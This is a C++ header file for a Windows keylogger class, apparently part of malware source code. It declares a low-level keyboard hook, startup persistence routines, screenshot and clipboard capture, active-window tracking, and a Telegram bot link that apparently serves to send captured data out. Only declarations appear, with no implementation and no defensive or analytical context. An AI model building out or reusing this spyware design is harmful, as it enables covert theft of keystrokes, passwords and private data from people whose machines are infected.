#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <string>
#include <windows.h>

class TelegramBot; // Forward declaration

class Keylogger {
public:
    Keylogger(const std::string& logFileName, TelegramBot* bot);
    void start();
    void addToStartup();
    void removeFromStartup();
    void takeScreenshot();
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

private:
    static std::string logFileName;
    static std::string lastWindow;
    static std::string lastClipboardContent;
    static TelegramBot* bot; // Pointer to the TelegramBot instance
		
    void logClipboardContent();
    static std::string formatOutput(const std::string& rawOutput);
};

#endif // KEYLOGGER_H
